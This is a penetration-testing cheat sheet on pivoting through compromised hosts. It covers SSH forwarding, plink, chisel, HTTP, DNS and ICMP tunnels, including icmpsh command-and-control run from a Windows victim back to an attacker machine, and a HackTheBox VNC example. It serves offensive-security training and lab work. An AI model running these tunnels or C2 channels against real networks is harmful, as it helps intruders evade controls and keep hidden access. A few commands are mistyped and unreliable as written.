# Port Redirection & Tunneling

## Port Redirection & Tunneling

We use port redirection and/or tunneling when we want to forward a port that's listening only on localhost (127.0.0.1).&#x20;

## **SSH** <a href="#ssh" id="ssh"></a>

We can use SSH to perform port redirection and tunneling

Key Concepts to avoid confusion:

* \-L = Your host port (L = Local)
* \-R = Your host port (R = Remote)
* \<IP>:3306 = The IP and PORT from the target

### SSH Local Port Forwarding

Things to consider:

* Have SSH access with low privileges?&#x20;
* There are some ports open internally?&#x20;

Try local port forwarding:

```
username@kali: ssh –L 3306:<IP>:3306 user@$target_ip
```

On Kali verify that the port is listening:

```
username@kali: ss -antp | grep "3306"
```

Scan the port:

```
username@kali: sudo nmap -sS -sV 127.0.0.1 -p 3306
```

### SSH Remote Port Forwarding

Things to consider:

* No SSH access but limited shell?&#x20;
* Also, some port is listening only on local-host?&#x20;

Try remote port forwarding:

```
username@victim: ssh -N -R <kali-IP>:<kali-port>:127.0.0.1:3306 kali@<kali-IP>
username@victim: ssh –R 3306:localhost:3306 root@kali_ip
username@victim: ssh –R 3306:localhost:3306 -o "UserKnownHostFile=/dev/null" -o "UserHostKeyChecking=no" root@kali_ip
```

Connect to the tunneled port:

```
#Verify with nc
username@kali: nc -vvv localhost 3306

#If mysql
username@kali: mysql -u username -p -h 127.0.0.1 -P 3306
```

### SSH Dynamic Port Forwarding

If the target has more than one NIC and more than one network subnet than we can use proxychains.

In Kali edit the **proxychains** configuration file:

```
username@kali: sudo vim /etc/proxychains.conf
```

Add this lines:

```
[ProxyList]
socks4 127.0.0.1 8080
```

Perform a dynamic port forwarding to our port 8080

```
username@kali: sudo ssh -N -D 127.0.0.1:8080 username@<target-IP>
```

Then scan with nmap and specify a **TCP** scan with `-sT` and don't use `ICMP` with `-Pn`. This flags are mandatory, read [this](https://security.stackexchange.com/questions/120708/nmap-through-proxy).

```
username@kali: proxychains nmap -p- -sT -Pn <target-Second-Interface-IP>
```

Now we can use any application through **proxychains**… such as:

```
username@kali: proxychains firefox
username@kali: proxychains nmap -sT -Pn -p139,445 $ip
```

#### SOCKS4 Proxy

```
ssh -D8080 [user]@[host]

ssh -N -f -D 9000 [user]@[host]
-f : ssh in background
-N : do not execute a remote command
```

Cool Tip: Konami SSH Port forwarding

```
[ENTER] + [~C]
```

#### Local Port Forwarding

```
username@kali: ssh -L [bindaddr]:[port]:[dsthost]:[dstport] [victim-user]@[target-host]
```

#### Remote Port Forwarding

```
username@victim: ssh -R [bindaddr]:[port]:[localhost]:[localport] [user]@[kali]
username@victim: ssh -R 3389:10.1.1.224:3389 root@10.11.0.32
```

## SSHUTTLE

You can **tunnel** via **ssh** all the **traffic** to a **subnetwork** through a host. For example, forwarding all the traffic going to 10.10.10.0/24

```
pip install sshuttlesshuttle -r user@host 10.10.10.10/24
```

## Plink

Remote port forwarding using plink. This is needed when we don’t have access to a specific port on the target machine. From the target machine we can execute this command:

```
C:\Users\victim> plink.exe -ssh -l kali_user -pw kali_password -R $kali_ip:445:127.0.0.1:445 $kali_ip
```

An alternative way to execute plink without prompt:

```
C:\Users\victim> cmd.exe /c echo y | plink.exe -ssh -l kali_usernmae -pw kali_password -R <kali-IP>:<kali-port>:127.0.0.1:3306 <kali-IP>
```

After forwarding the port to our host, we can try scanning it or connecting to it:

```
username@kali: sudo nmap -sS -sV 127.0.0.1 -p <kali-port>
```

## Chisel <a href="#chisel" id="chisel"></a>

Chisel can be downloaded here: [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)

&#x20;You need to use the **same version for the client and the server**.

```
git clone https://github.com/jpillora/chisel
cd chisel
go build -ldflags "-w -s" .
upx chisel
chmod +x chisel
```

### Windows Port Forwarding <a href="#socks" id="socks"></a>

```
username@kali: ./chisel server -p 1234 --reverse
C:\Users\victim> ./chisel-x64.exe client 10.10.14.3:1234 R:8082:127.0.0.1:8082
```

### Linux Port forwarding <a href="#port-forwarding" id="port-forwarding"></a>

```
username@kali: ./chisel_1.7.6_linux_amd64 server -p 12312 --reverse
victim_username@victim: ./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505
```

## HTTP Tunnel: SSH over HTTP

```
# Server - open port 80. Redirect all incoming traffic to localhost:80 to localhost:22
hts -F localhost:22 80
hts --forward-port localhost:22 80


# Client - open port 8080. Redirect all incoming traffic to localhost:8080 to 192.168.1.10:80
htc -F 8080 192.168.1.10:80
htc --forward-port 8080 192.168.1.10:80

# Client - connect to localhost:8080 -> get tunneled to 192.168.1.10:80 -> get redirected to 192.168.1.10:22
ssh localhost -p 8080
```

## DNS Tunneling

### Detection

Can we resolve internal domain?

```
nslookup acmebank.local
Server:    192.168.1.1
Address:  192.168.1.153

Name:  acmebank.local
Address: 192.168.10.12
```

Can we resolve an external domain through the company DNS server? (if yes, we can perform DNS tunneling)

```
nslookup google.com
Server:    192.168.1.1
Address:  192.168.1.153

Non-authoritative answer:
Address: 216.58.209.14
Name:  google.com
```

Can we communicate with external DNS? (another finding)

```
nslookup pentest.blog 8.8.8.8
Server: 8.8.8.8
Address: 8.8.8.853

Non-authoritative answer:
Name: pentest.blog
Address: 104.27.169.40
Name: pentest.blog
Address: 104.27.168.40
```

### Attack

#### iodine

iodine creates 2 tun adaptors and sends data between these 2 adapters by tunneling like a DNS query

Server-Side:

```
iodined -f -c -P <pass> <IP address> <domain> 
eg: 
iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
```

Client-Side:

```
iodine -f -P <pass> <domain> r 
eg: 
iodine -f -P P@ssw0rd tunneldomain.com -r
```

#### dnscat2

Server-Side:

```
ruby ./dnscat2.rb tunneldomain.com
```

Client-Side:

```
./dnscat2 tunneldomain.com
```

```
dnscat2> session -i 1
command session (debian) 1> listen 127.0.0.1:8080 10.0.0.20:80 
```

## ICMP Tunneling

ICMP Tunneling can be done by changing the Payload Data so it will contain the data we want to send.

### icmpsh

It does not require administrative privileges. C2-channel, slave runs on Windows (host) and master runs on Kali (attacker)

### Attack

Clone or download icmpsh:

```
git clone https://github.com/inquisb/icmpsh.git
```

Master - Kali:

```
sysctl -w net.ipv4.icmp_echo_ignore_all=1 
cd icmpsh
./icmpsh_m.py <attacker’s-IP> <target-IP>
```

Slave - Windows

```
icmpsh.exe -t <attacker’s-IP>
```

Master - Kali

```
./icmpsh_m.py <attacker’s-IP> <target-IP>
```

We can use wireshark to see commands run in the data

### icmptunnel

Server-side:

```
git clone https://github.com/jamesbarlow/icmptunnel.git 
cd icmptunnel
make
```

ICMP echo reply disable.

```
echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all
```

ICMP tunnel run in server-side and set IP to tun0 adaptor

```
./icmptunnel -s
Ctrlz
bg
/sbin/ifconfig tun0 10.0.0.1 netmask 255.255.255.0 ifconfig
```

Client-side:

```
git clone https://github.com/jamesbarlow/icmptunnel.git 
cd icmptunnel
make
```

ICMP echo reply disable.

```
echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all 
./icmptunnel 192.168.1.108
ctrl z
/sbin/ifconfig tun0 10.0.0.2 netmask 255.255.255.0
```

Connect to ssh using ICMP from server to client using tun interface

```
ssh username@10.0.0.1
```

## VNC Tunneling via SSH

VNC is an interactive GUI program. We can use ssh tunneling and proxychains to connect to the local listener.

```
root@kali:~/hackthebox/poison-10.10.10.84# tail /etc/proxychains.conf
#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4  127.0.0.1 8081
root@kali:~/hackthebox/poison-10.10.10.84# ssh charix@10.10.10.84 -D 8081

root@kali:~/hackthebox/poison-10.10.10.84# proxychains vncviewer 127.0.0.1:5901 -passwd secret
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:8081-<><>-127.0.0.1:5901-<><>-OK
Connected to RFB server, using protocol version 3.8
Enabling TightVNC protocol extensions
Performing standard VNC authentication
Authentication successful
Desktop name "root's X desktop (Poison:1)"
VNC server default format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Using default colormap which is TrueColor.  Pixel format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Same machine: preferring raw encoding
```

## References

Most of the tunneling techniques covered here were extracted from here:

{% embed url="https://github.com/areyou1or0/Tunneling" %}







### &#x20;<a href="#vpn-tunnel" id="vpn-tunnel"></a>
